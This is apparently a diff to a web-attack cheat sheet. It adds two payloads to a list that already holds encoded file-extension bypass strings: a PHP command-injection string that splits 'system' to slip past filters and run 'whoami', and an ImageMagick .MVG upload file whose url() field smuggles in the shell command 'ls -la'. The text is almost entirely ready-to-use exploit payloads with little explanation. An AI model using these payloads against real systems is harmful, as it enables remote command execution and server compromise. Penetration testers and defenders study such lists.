@@ -117,3 +117,14 @@ exploit%xC0%x2Ephp
 exploit%xC4%xAEphp
 exploit%xC0%xAEphp
 ```
+16. dividing the function name into sections between each
+```
+URL?cmd=(sy.(st).em)(whoami);
+```
+17. Exploit .MVG files, upload a .mvg file with the following content
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg";|ls "-la)'
+pop graphic-context
+```
